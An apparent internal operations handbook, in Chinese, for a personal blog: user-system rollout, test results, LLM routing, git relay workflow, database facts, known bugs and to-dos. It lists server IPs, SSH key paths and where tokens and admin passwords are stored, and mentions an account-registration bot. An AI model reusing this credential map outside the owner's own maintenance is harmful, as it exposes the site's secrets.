- **验收脚本**（服务器 `/data/blog/scripts/acceptance/`，本机留档 `C:\Users\QianXi\.dsh-ops\blog\`）：`e2e_users.py`、`e2e_email_auth.py`、`e2e_admin_users.py`（跑法 `python3 <脚本> <base_url> <db_path> [容器名]`），配套 `run_all_e2e.sh`（重建演练容器后三套连跑，必须先重建：限流桶是进程内的，不重建会吃上一轮的 429）。**别放 /tmp**：重启即失，而且 **`/tmp` 上跑不了 WAL 模式的 SQLite**（-shm 需要 mmap/共享内存支持，实测 `disk I/O error` → `readonly database`；演练库和副本一律放 `/data` 或 `/root`）。
- **上线验收证据（2026-09-28 当次现跑）**：演练容器 `users3` 上三套 **users 55/0 + email 46/0 + admin 101/0**；**生产**（`127.0.0.1:8000` + 真实库）email **46/0**、admin **101/0**，跑后库无 e2e 残留（users 2 / 文章 23 / 评论 42 / 提示词 25，integrity ok）；公网回归全 200（首页/文章/标签/分类/归档/提示词/设置/热点/logo/ai-daily），`/admins/users` 未登录 401；A-RAG 流式事件正常（`text`/`done`/`tool_*`）。

## 用户系统（2026-09-26 上线，镜像 `qianxi-blog:users2`）

- **`users` 是全站唯一人员表**：管理员已并入（保留原 `admins.id`：`qianxi`=1、`admin`=3，均 `super_admin`/`active`）。`admins` 表**停用但不删不重命名**（SQLite 外键重排风险）。角色 `user/admin/super_admin`，状态 `active/banned`，密码哈希两者同构（bcrypt），旧管理端口令照用。
- **权限只信数据库行**：token 里只有 `sub=user_id`，角色每次请求从 `users` 读；封禁用户下一次请求即 401/403。
- **投稿审核流**：`draft → pending_review →(管理员) published/rejected`。用户端点 `POST/PUT /api/v1/users/me/articles`、`POST …/{id}/submit`、`DELETE …/{id}`；管理端点 `GET /api/v1/articles/review/pending`、`PUT /api/v1/articles/{id}/review`（驳回必须带非空 `review_note`，重复审核返回 400）。非 `pending_review` 的文章不出现在公开列表。
- **评论双轨**：登录用户评论写 `user_id`（展示账号昵称/头像），访客匿名评论不变；删评论限本人或管理员，越权 403。`CommentResponse` 增加 `user_id/username/user_display_name`。
- **注册**：默认开放，站点设置 `user_registration_enabled`（`true/false`，`PUT /api/v1/settings/…`）可随时关；用户名 `^[a-zA-Z0-9_-]{3,30}$`、密码 ≥8 位、邮箱选填且不校验。
- **作者邮箱脱敏**：`AuthorResponse` 对 `role=user` 的作者把 email 置空，管理员联系方式保留。
- **限流**（`backend/app/core/ratelimit.py`，进程内计数、**每 worker 独立**，故双 worker 实际额度≈2×）：评论 5 次/分/IP、投稿提交 3 次/天/用户、注册 5 次/小时/IP。
- ⚠️ **限流依赖真实访客 IP**：uvicorn 必须带 `--proxy-headers --forwarded-allow-ips='*'`（nginx 已传 `X-Real-IP`/`X-Forwarded-For`）。漏了参数时容器只看到 docker 网关 IP，**全站共用一个限流桶**（2026-09-26 实测踩过）。
- 迁移脚本 `/data/blog/migrate_users.py`（一次性：admins→users 保 id、重建 articles 表加 `pending_review/rejected` 与 `review_note`、comments 补 `user_id` 并回填；库中已有 `users` 表则拒绝执行）。**迁移必须在应用停止时做**。迁移前库备份：`/data/blog/backups/pre-user-system-20260926-204453/`。
- **回退**（旧脚本已废弃，勿用）：`rollback_users.sh` 会在 `set -eu` 下先删容器再整库覆盖，中途失败即站点全挂，现已改为 `rollback_users.sh.deprecated`。**现行用 `bash /data/blog/rollback.sh qianxi-blog:users4`**（只换镜像、不动数据库、起不来自动退回原镜像）。
- 管理后台新增两个 tab（`frontend/pages/AdminDashboard.tsx` + `frontend/components/UserAdminPanels.tsx`）：「用户文章审核」通过/驳回、「用户管理」搜索/封禁/解封。
- 验收脚本（服务器 `/data/blog/scripts/acceptance/`，本机留档 `C:\Users\QianXi\.dsh-ops\blog\`）：`e2e_users.py`（52 项端到端，跑法 `python3 e2e_users.py http://127.0.0.1:8001`，需先起演练容器）、`logout_probe.py`（登出四态）、`load_ka.py`（保活压测）、`public_regression.sh`（公网回归）。**别放 /tmp**：重启即失。
- 上线当天验收证据（全部当次现跑）：E2E 在最终镜像 `users2` 上 **52/0**；登出探针 5/0（普通用户 200，此前是 403）；生产 UI 实走 注册→投稿→（后台）审核→公网可见；公网保活压测 **73.3rps / p50 374ms / 0 错**（并发优化基线 62.6rps 公网、70.6rps 直连）。

**回退方式**：把 Cloudflare DNS 的 A 记录改回橙云代理（原 Worker 路由 `blog.qianxi7988.me/* → qianxi-blog-site` 仍在）。数据回退需注意：新站库从导出后一直在被写（浏览量、聊天），回退前先备份新库。

## AI 链路（2026-10-26 核对）

两条独立的链，别混：

**站点对话（A-RAG / 摘要 / 后台 AI 助手）** — `backend/app/services/llm_router.py`

- `DEFAULT_MODEL_CHAIN`（12 个，按序 fallback）：`mynewapi/grok-4.5` → `mynewapi/gpt-5.6-terra` → `cpa/grok-4.5` → `mynewapi/gpt-5.5` → `mynewapi/gpt-5.6-luna` → `mynewapi/deepseek-ai/deepseek-v4-flash` → `mynewapi/stepfun-ai/step-3.7-flash` → `mynewapi/minimaxai/minimax-m3` → `mynewapi/moonshotai/kimi-k2.6` → `mynewapi/deepseek-ai/deepseek-v4-pro` → `mynewapi/z-ai/glm-5.2` → `mynewapi/minimaxai/minimax-m2.7`。
- `LLM_MODEL_CHAIN` 若设则**整体覆盖**上面的链；`OPENAI_MODEL` + `OPENAI_MODEL_FALLBACKS` 是另一种配法。`ZHAIYAO_MODEL` 可单独给摘要指定模型。
- 凭据：NewAPI token `blog-devlog`。**分组必须是 svip/vip**——grok 系列只在 CPA 渠道上，渠道分组是 `svip,vip`，token 在 `default` 分组会 503 `model_not_found`（实测踩过）。
- 网关地址 `http://new-api:3000/v1`（容器内），依赖 docker 网络 `blog-net`。
- 验证记录（2026-09-24）：公网 `POST /api/v1/chat/prompt-lab` 与 `POST /api/v1/chat/message` 均 200 真实补全；A-RAG 公网 SSE 实测 142 reasoning + 3 tool_start/result + 45 text + 1 done。
- 不要改 NewAPI 渠道/超时；不要动 `43.128.75.66` 与 `43.160.202.101` 上的 CPA、Grok 注册机、openclaw。

**热点流水线（写作/规划/审稿）** — 独立 key、独立 base

- `PIPELINE_API_BASE=https://api.stepfun.com/step_plan/v1`、`PIPELINE_MODEL=step-5-preview`、`PIPELINE_API_KEY`（千禧 2026-10-10 提供）。
- `graph.py:137` 有硬检查：`PIPELINE_API_KEY` 没配就抛错，**拒绝静默 fallback 到 `OPENAI_API_KEY`**。
- 详见上面「热点文章流水线」节。

## 源码与仓库

- 仓库 `qianxi-00/My_Blog`，默认分支 `master`。**服务器 `/data/blog/repo-tmp` 是权威**（`origin` 走 deploy key `/root/.ssh/github_my_blog_deploy_repo`）；2026-10-26 实测 `HEAD` == `origin/master` == `f70f886`，`git rev-list --count HEAD..origin/master` = 0，`git status --porcelain` 空。
- **本机 GitHub 直连经常失败**（`Failed to connect to github.com port 443 after 21115 ms` / `Recv failure: Connection was reset`），所以**本机没有该仓库的推送授权，一切提交走服务器代推**。
- 本地克隆 `C:\Users\QianXi\.dsh-ops\blog\My_Blog` 有两个 remote：
  - `origin` = `https://github.com/qianxi-00/My_Blog.git`（本机通常连不上）
  - `relay` = `root@101.32.163.17:/data/blog/repo-tmp`（**对齐用这个**）
- **对齐命令**（两侧都是浅克隆，`.git/shallow` 只有 3 行、约 125 个提交，完整历史只在 GitHub）：
  ```bash
  GIT_SSH_COMMAND="ssh -o BatchMode=yes" git fetch relay master
  git reset --hard relay/master
  ```
  直接用 `git fetch <url> master` 取 FETCH_HEAD 在浅克隆上会失败（`shallow roots are not allowed to be updated`），必须先 `git remote add relay …`。
- **推送流程**：把改动文件**按字节**复制进 `/data/blog/repo-tmp` → `git add -A && git -c core.autocrlf=false commit -F <msgfile>` → `GIT_SSH_COMMAND="ssh -i /root/.ssh/github_my_blog_deploy_repo -o IdentitiesOnly=yes -o BatchMode=yes" git push origin HEAD:master`。
  - ⚠️ **不要用 patch 硬打**：仓库 blob 是 CRLF，本机克隆在部分文件上仅行尾不同，硬打会产生大段假 diff。
  - ⚠️ **提交信息不要用 heredoc + 反引号**：会被 shell 吃掉（三十二期实测，`规划层·论文检索: ...` 整段消失）。写进 `/tmp/msgN.txt` 再 `git commit -F`。
- **本地工作副本不要盲目提交**：本地 clone 落后时，`git status` 会显示一堆 M，那些是本地旧版与服务器版的差异残留。以服务器仓库为准，必要时 `git reset --hard relay/master` 丢弃。
- **上传文件用 `ssh_runner.py`**（`C:\Users\QianXi\.dsh-ops\ssh_runner.py`，不在 `blog\` 下）：`put` / `get` / `exec --cmd` / `exec --script`。`put` 前先 `Set-Location` 到含目标文件的目录（相对路径解析）。远程 `.sh` 上传后**必须 CRLF→LF 规范化**（`sed -i 's/\r$//'`），否则 `bad interpreter`。
- 仓库结构：`backend/`（FastAPI）、`frontend/`（React+Vite）、`docs/`（VitePress 文档站，6 个 .md）、`scripts/ci/`（两个部署脚本）、`ops/cron/`（cron 留档）。`git ls-files` = **575** 个文件；`frontend/dist` 与 `docs/.vitepress/dist` 未被跟踪。

## 数据事实

| 副本 | 状态 |
|---|---|
| `/data/blog/data/blog.db`（**生产库**） | WAL，27,742,028 B，30 张表。**23 篇文章 / 606 条热点（597 published + 9 draft）/ 2 个用户 / 42 条评论**（2026-10-26 实测） |
| `/data/blog/data/blog.db.bak-cat-20261026-092952` | 三十六期分类归一前的备份，同尺寸 |
| `/data/blog-live-20260924.db` | 2026-09-24 从 HF 导出的原件（留档） |
| `/data/blog.db` | 旧快照（2026-07-09，532 热点），**不要拿来当生产** |
| 仓库 `backend/data/db_part_0..12.dat` | 13 片种子，种子完整集 |
| 文章 Markdown `/data/My_Blog/Articles` | 11 个 .md，与线上 23 篇**不是同一批**，别混 |

- **文章库是 2026 年 3~4 月的老内容**（最新 id 108，2026-04-21）。日常内容产出靠热点流水线（`hot_topics`），不是 `articles`。
- **`hot_topics` 的日期字段三个含义不同**：
  - `created_at` = 真实写入时间（UTC）。
  - `published_at` = 编辑日期。**十八期的 redate 均摊脚本把 23 篇老文章的 `published_at` 改到了未来日期（10-28~10-31）**，这就是三十四期要改排序字段的原因。
  - `topic_date` = 选题日期。
  - 容器跑 UTC，`_now_bj()` 给北京时间，所以 `published_at ≈ created_at + 8h`。前端 `formatDateTime` 用 `new Date()` 解析无时区后缀的 ISO 串会当本地时间——`published_at` 显示比 `updated_at` 晚 8 小时是既有现象。
- **分类只有 6 个合法值**：`AI基础设施 / AI模型 / AI产品 / AI应用 / AI安全 / 其他`（`backend/app/services/hotspot_pipeline/prompts.py:213` 的 `PRIMARY_CATEGORIES`）。三十六期后 writer 有白名单校验，历史 55 种写法已归一，"其他"归零。
- `articles.slug` **全站没有写入路径**，恒为 null（见已知缺口）。

## 已知缺口（2026-10-26 复核）

1. ~~Live2D 是死代码~~ **已清理（四十期，`eaafeda`）**。`Live2DWaifu` 与 `naihe-live2d-widget-v3` 全仓库零引用，`frontend/public/live2d/` 曾有 **220 个文件、191M**（此前文档误记为“空目录”），nginx 日志里 live2d 请求数为 0。已 `git rm -r` 移出版本控制并删掉 `dist/live2d`，`dist` 从 219M 降到 28M。站点宠物是静态 `DesktopPet`（`/images/codex-pets/*/poster.webp`），不受影响。需要恢复时 `git checkout <commit> -- frontend/public/live2d`（历史 blob 仍在）。
2. **141 个内联图已排查定案（2026-09-24）**：5 个从图床 My_image 找回并字节级验证；**136 个永久丢失**——仓库 public、本地 dist、旧 Worker 部署包、COS 桶（545 对象）、My_image（1370 文件）、过期旧服务器 `8.148.252.27` 全部查尽，原件只存在于已消亡的 HF 容器层。是否清除 `analysis_md` 里的死引用，等千禧拍板。
3. **管理端新上传的图片写进容器层**：`backend/app/api/v1/upload.py:45-48` 落盘 = `os.path.join(dirname×3(__file__), settings.UPLOAD_DIR)` → 容器内 `/app/uploads`；而 nginx 的 `/uploads/` 服务的是 `/var/www/blog/dist`，**不读容器层**。durable 副本仍要靠 `frontend/public/uploads` 进 Git。**未修**。
4. ~~`chat.py` 的 `get_session_history` 没有路由装饰器~~ **已修复**（2026-10-26 复核：`backend/app/api/v1/chat.py:520-521` 有 `@router.get("/session/{session_id}/history", response_model=ChatSessionWithMessages)`）。该条关闭。
5. **APScheduler 在依赖里但无调度器**：`apscheduler==3.10.4` 在 `requirements.txt` 里，`APScheduler`/`BackgroundScheduler`/`AsyncIOScheduler` 在 `backend/app/` **零命中**。定时任务全靠宿主 cron。热点抓取 `trigger_mode` 写死 manual。
6. **提示词同步可用但内容贫瘠（2026-09-24）**：扣子账号只有 2 个机器人——AI面试知识库（1879 字人设，已投递待审核）、海龟汤主理人（人设为空，逻辑在工作流里、API 不暴露）。6 月那批 14 条电商提示词的源机器人已不在账号里。
7. **旧数据遗留（非后引入）**：`chat_messages` 有 5 行指向已删除的 `chat_sessions`（198 条消息中），`PRAGMA foreign_key_check` 会报。外键未强制，线上无影响。
8. **`email_verification_required` 是摆设**：`users.email_verified` 有 4 个写入点（注册带码、用户绑邮箱、管理端改邮箱、迁移脚本回填）但**没有一处读它做门禁**；站点设置 `email_verification_required` 全仓库**只有 `backend/app/models/settings.py:58` 的播种定义，0 个读取点**。要么接入门禁、要么删掉这个设置。
9. **`admins` 表已休眠但仍被引用**：`api/v1/settings.py:49` 仍 `select(Admin).where(role=="super_admin")` 取超管；4 个 FK 列指 `admins.id`（`comments.admin_id`、`images.uploaded_by`、`hot_topics.created_by`、`forum.admin_id`）；另有 **9 个**模块仍 import（`agent`/`comments`/`forum`/`hotspots`/`prompts`/`settings`/`subscribe`/`stats`/`upload`）。一期已定「停用不删不重命名」（SQLite 外键重排风险）。
10. **验收/探针脚本不在 Git 仓库里**：三套 e2e 在服务器 `/data/blog/scripts/acceptance/`，三期专项探针在 `/root/probe_batch1.py`。仓库 `scripts/` 里**没有** `acceptance/`。存在与仓库漂移风险。
11. **前端「相关新闻」永远为空**：`frontend/pages/ArticleDetail.tsx:49` 只有 `useState<ArticleListItem[]>([])`、**从不对它赋值**（只在 L955 传给 `ArticleSidebar`）；后端虽已补 `GET /articles/slug/{slug}`（`backend/app/api/v1/articles.py:411`），但 **`articles.slug` 全站无写入路径，恒为 null**。`App.tsx` 的 `/article/:slug` 路由本身仍是死链。
12. **侧边栏"技术栈分类"与"分类"筛选重复**（三十六期归一后新增）：`HotspotsList.tsx:201-212` 的 `getStackValues()` 映射 `PRIMARY_CATEGORY_GROUPS`，归一后分组名与分类值 1:1，两个筛选器筛同一维度。要么删侧边栏那块，要么给技术栈另立维度（如按 `topic_tag`）。**未动**。
13. **详情页右栏在中等宽度挤占正文**（三十七期发现，未动）：`HotspotDetail.tsx` 右栏是 `hidden lg:block w-80`，1024-1279px 时左右两栏占 640px，main 只剩 384px、卡片内宽约 256px，标题约 8 字/行。建议改 `hidden xl:block`。
14. **`docs/.vitepress/dist` 与 `frontend/dist` 在本地存在但未跟踪**，属正常（`.gitignore` 挡的）。

## 验证（改完必跑）

```powershell
# 1) 公网接口
Invoke-WebRequest 'https://blog.qianxi7988.me/api/v1/articles?page=1&page_size=1' -UseBasicParsing
Invoke-WebRequest 'https://blog.qianxi7988.me/api/v1/hotspots?page=1&page_size=1' -UseBasicParsing

# 2) 容器健康（直连，绕 nginx）
ssh root@101.32.163.17 "curl -fsS http://127.0.0.1:8000/health"

# 3) AI 冒烟（烧少量 quota）
Invoke-WebRequest 'https://blog.qianxi7988.me/api/v1/chat/prompt-lab' -Method Post -ContentType 'application/json' -Body '{"prompt":"回复OK","max_tokens":16}'
```

**2026-10-26 预期值**：`articles.total` = **23**、`hotspots.total` = **597**（2026-10-26 实测；这个数每天在长，别当常量）、health `{"status":"healthy"}`、prompt-lab 返回 200 带 result。

⚠️ **`page_size` 上限 100**，传 200 会返回 **0 条**（不是报错，是静默空结果），排查时容易误判。

**前端改完**：
```bash
cd frontend
node ./node_modules/typescript/bin/tsc --noEmit -p tsconfig.json   # 必须 cd 进 frontend，仓库根没有 package.json
```
本地 `node_modules` 已装好（约 396 项）。**用 npm，不要用 pnpm**——本地是 `package-lock.json`，pnpm 会把依赖移进 `.ignored`（"Moving X that was installed by a different package manager"），破坏环境。

**部署后验证线上产物**（前端改动必查）：
```bash
# 服务器上
grep -o '/assets/index-[A-Za-z0-9_-]*\.js' /var/www/blog/dist/index.html
ls -l /var/www/blog/dist/assets/ | grep <新chunk名>
# 公网
curl -s -o /dev/null -w '%{http_code}\n' https://blog.qianxi7988.me/assets/<chunk>.js
```
⚠️ **浏览器验证要加 cache-buster**（如 `?v=20261026`）：SPA 切 hash 路由**不会**重新拉 `index.html`，拿到的还是旧 chunk 名。必须刷新文档。

**后端改完**：容器内直调比接口更快——
```bash
docker exec qianxi-blog python3 -c "import app.main; print('ok')"
```

**三期（users4）那套 e2e**（历史留档，跑前要重建演练容器，因为限流桶是进程内的）：
```bash
python3 /data/blog/scripts/acceptance/run_all_e2e.sh    # 预期 users 55/0 + email 46/0 + admin 101/0
python3 /root/probe_batch1.py                           # 三期专项探针 22 项
```

## 凭据位置（无明文）

- HF token / Cloudflare API token：主服务器 `/root/openclaw-config-backup-20260924-110346.tar.gz` 内 `.openclaw/secrets/`
- NewAPI 博客 token：NewAPI MySQL `tokens` 表 `name='blog-devlog'`；容器里经 `runtime.env` 注入
- stepfun 流水线 key：`/data/blog/runtime.env` 的 `PIPELINE_API_KEY`
- 博客后台管理员：库 `admins` 表（bcrypt），HF Space secrets 里有明文口令（`SUPER_ADMIN_*`），本地没有
- GitHub deploy key：`/root/.ssh/github_my_blog_deploy_repo`
- 扣子 PAT：`/data/blog/coze.env`（600 root-only，最长 30 天过期）
- 本机 SSH 私钥：`C:\Users\QianXi\.ssh\id_ed25519`（`101.32.163.17` 已配 IdentityFile）

## 待办（未获确认不动）

1. ~~7/19 版差异回仓~~ 已完成（`f05e117` + `d4ae1bd`）。
2. 旧栈处置：HF Space 与 Worker `qianxi-blog-site` 保留多久后删除；workers.dev 旧站仍公开可访问。
3. 前端 dist 与旧 Worker assets 的同源性核对（1790B vs 1955B，旧 assets 可能含未回仓前端改动）。
4. ~~内联图找回~~ 已定案：5 个恢复、136 个永久丢失；待拍板是否清除 `analysis_md` 里的死引用。
5. ~~备份扩展~~ 已完成。
6. **删前端死代码 live2d**（`Live2DWaifu.tsx` + `public/live2d` 空目录 + `package.json` 里的 `naihe-live2d-widget-v3`）。
7. ~~推 GitHub（三期）~~ 已完成。
8. ~~nginx 覆写 XFF~~ 已完成。
9. **Tailwind 构建期迁移**（收益可能大于任何单项，建议单独立项）：`frontend/index.html` 仍在用 `cdn.tailwindcss.com` 浏览器端运行时 JIT（阻塞 FCP）。**注意**：`frontend/` 下**没有** `tailwind.config.*` / `postcss.config.*`，`tailwindcss`/`postcss`/`autoprefixer` 也不在 `package.json` 里——迁移时要把 CDN 版那份配置（`darkMode:'class'`、`primary` 色板=sky、`slate.850`、`spacing 4.5`、Noto Sans SC 字体栈）逐项等价复刻。**字体只加载了 400/500/700/900**，中文下 `font-semibold`(600) 会向上取 700、与 `font-bold` 渲染完全相同，别用它做层级区分。
10. **图片缩略图**：封面图仍是原图直出（单张最大 884KB），本期只做了懒加载。根治需后端出缩略图。
11. **README 技术栈叙述系统性过时**：README 713 行通篇还在讲 **MySQL**（简介、存储组件、端口 3308、环境要求、驱动、健康检查），而真实生产自迁移后一直是 **SQLite + aiosqlite + WAL**。文档站已按现实写，两者公开矛盾。需整体核对一轮后单独提交。
12. **详情页右栏 `hidden lg:block` → `hidden xl:block`**（三十七期发现，见已知缺口 13）。
13. **侧边栏"技术栈分类"筛选重复**（三十六期归一后，见已知缺口 12）。
14. **`MIN_BODY_CHARS` 是否从 4500 提到 5500**（曾提过，未拍板）。
15. **stepfun key 轮换**（曾提过，未做）。

## 待确认（自主判断，待千禧拍板）

1. ~~nginx XFF 是否已落地~~ 已落地，关闭。
2. ~~三套 e2e 要不要在生产补跑~~ 已跑（users 55/0、email 46/0、admin 101/0，跑后数据零变化、探针残留 0），关闭。
3. **重置密码发码的"已发送"话术是否要补偿性提示**：为消枚举统一话术后，真正被限流/域名不允许的已注册用户也只看到"已发送"。是否在「忘记密码」页加一句"若几分钟内未收到，请等冷却结束后重试"？
4. **`email_verification_required` 的去留**：接入门禁（改注册流）还是从 `DEFAULT_SETTINGS` 删掉？（已知缺口 8）
5. ~~`/article/:slug` 路由~~ 后端已补 `GET /articles/slug/{slug}`，但 `articles.slug` **全站无写入路径**，要真正启用还得补 slug 生成逻辑。
6. ~~`deploy_frontend_dist.sh` 的静默失败~~ **已根治**：八期起前端部署走 `scripts/ci/deploy_frontend.sh`，内置三关结构校验（`index.html` 存在 / 引用的主 chunk 真实存在 / 文件数 ≥50），失败即中止并回滚。
7. **旧 chat 会话无归属**：`chat_sessions` 存量 168 行的 `user_id`/`owner_ip` 都是 NULL，按当前规则只有管理员能删。是否需要写一次性脚本清理？
8. **`hot_topics` 的 `published_at` 未来日期要不要修**：十八期 redate 把 23 篇改到 10-28~10-31，三十四期只把**排序**改用 `created_at` 规避，`published_at` 本身仍是未来日期（前端展示、月份归档都还用它）。要么等时间自然走完（10-31 后自动正常），要么写脚本重排。
